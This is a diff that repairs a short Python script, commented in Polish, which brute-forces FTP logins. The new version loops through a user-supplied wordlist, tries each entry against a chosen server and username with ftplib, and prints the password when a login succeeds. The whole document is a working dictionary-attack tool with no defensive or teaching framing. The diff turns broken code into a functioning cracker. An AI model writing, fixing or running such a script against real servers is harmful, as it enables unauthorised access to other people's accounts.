@@ -1,28 +1,58 @@
-#! /usr/bin/python3
-# Skrypt Python do lamania hasel FTP
+#!/usr/bin/python3
+
+# Skrypt Python do łamania haseł FTP
+
+
 
 import ftplib
 
-server = input(Serwer FTP: ")
-user = input("Nazwa uzytkownika: ")
-Passwordlist = input ("Sciezka do listy hasel > ")
+
+
+server = input("Serwer FTP: ")
+
+user = input("Nazwa użytkownika: ")
+
+password_list_path = input("Ścieżka do listy haseł > ")
+
+
 
 try:
 
-	with open(Passwordlist, 'r') as pw:
-		for word in pw:
-		word = word.strip('\r').strip('\n')
+    with open(password_list_path, 'r') as pw_file:
 
-		try:
+        for word in pw_file:
 
-			ftp = ftplib.FTP(server)
-			ftp.login(user, word)
+            word = word.strip()  # Usuń znaki końca linii i białe znaki
 
-			print ('SUKCES! Haslo to: ' + word)
 
-		except:
-			print ('nadal probuje...')
 
-except:
+            try:
 
-	print ('Blad listy hasel')
+                ftp = ftplib.FTP(server)
+
+                ftp.login(user, word)
+
+                print('SUKCES! Hasło to: ' + word)
+
+                ftp.quit()  # Zamknij połączenie po udanym logowaniu
+
+                break  # Jeśli hasło jest poprawne, zakończ pętlę
+
+
+
+            except ftplib.error_perm:
+
+                print('Niepoprawne hasło, próbuję dalej...')
+
+
+
+except FileNotFoundError:
+
+    print('Błąd: Nie znaleziono listy haseł')
+
+
+
+except Exception as e:
+
+    print('Wystąpił błąd:', e)
+
